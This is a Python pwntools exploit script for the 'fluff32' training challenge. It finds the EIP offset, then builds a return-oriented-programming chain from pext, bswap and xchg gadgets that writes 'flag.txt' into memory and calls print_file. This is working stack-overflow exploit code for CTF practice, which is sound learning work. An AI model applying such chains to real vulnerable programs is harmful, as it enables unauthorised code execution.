from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    # Start the exploit against the target
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-peda
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './fluff32'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================


def find_eip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP at the time of crashing
    eip_offset = cyclic_find(p.corefile.eip)
    info('located EIP offset at {a}'.format(a=eip_offset))
    # Return the EIP offset
    return eip_offset


# Pass in pattern_size, get back EIP offset
eip_offset = find_eip(cyclic(100))

# Start program
io = start()

# Address of .data section (size=8 bytes)
data_section_address = 0x0804a018

# Need to get our string into ebp ready for the next gadget which moves ebp to eax [pext mask]
pop_ebp = 0x080485bb  # pop ebp; ret;

# Mov ebp to eax
# Mov 0xb0bababa to ebx
# pext edx, ebx, eax - (we control the eax [mask])
# Mov 0xdeadbeef to eax (who cares?)
long_pext_gadget = 0x08048543  # mov eax, ebp; mov ebx, 0xb0bababa; pext edx, ebx, eax; mov eax, 0xdeadbeef; ret;

# Pop ecx and bswap (swap between big/little endian) [.data address]
bswap_ecx = 0x08048558  # pop ecx; bswap ecx; ret;

# Exchange a byte in dl (LSB of edx) with byte in memory location pointed to by ecx [write to .data]
xchg_ecx_dl = 0x08048555  # xchg byte ptr [ecx], dl; ret;

# Finally we call print file function, passing in the address of the string (flag.txt)
print_file = 0x80483d0

# Print out important addresses
info("%#x data_section_address", data_section_address)
info("%#x pop_ebp", pop_ebp)
info("%#x mov eax, ebp; mov ebx, 0xb0bababa; pext edx, ebx, eax; mov eax, 0xdeadbeef; ret;", long_pext_gadget)
info("%#x pop ecx; bswap ecx; ret;", bswap_ecx)
info("%#x xchg byte ptr [ecx], dl; ret;", xchg_ecx_dl)
info("%#x print_file", print_file)

string_to_write = "flag.txt"  # We don't actually use this, just here for reference
# We'll be using this mask, which we calculated in a seperate script (find_mask.py)
full_mask = [0xb4b, 0x2dd, 0x1d46, 0xb5a, 0x1db, 0xacd, 0x1ac5, 0xacd]
fluff_xploit = b""

# Loop through each mask, using index as data section offset
for data_section_offset, mask in enumerate(full_mask):
    # Pop our current mask byte into the ebp
    fluff_xploit += pack(pop_ebp)
    fluff_xploit += pack(mask)
    # Perform pext (masking operation) using 0xb0bababa (hardcoded) and our mask byte, place result in edx (dl)
    fluff_xploit += pack(long_pext_gadget)
    # Pop data section address offset to ecx (also performs bswap to swap endianness, hence us setting to big first)
    fluff_xploit += pack(bswap_ecx)
    fluff_xploit += pack(data_section_address + data_section_offset, endian='big')  # Address of .data section with offset to current char
    # Exchange the byte in edx (dl - result of masking) with the byte pointed to by ecx (our dataset offset)
    fluff_xploit += pack(xchg_ecx_dl)

# Craft payload which injects "flag.txt" into data section of memory
# And calls print_file() with the string memory location
payload = flat(
    asm('nop') * eip_offset,  # Offset - 44 bytes
    # Magic happens here
    fluff_xploit,
    print_file,  # Call print_file()
    0x0,  # Return pointer
    data_section_address  # Location of flag.txt string
)

# Send the payload to a new copy of the process
io = start()
io.sendlineafter('>', payload)
io.recvuntil('Thank you!\n')

# Get our flag!
flag = io.recv()
success(flag)
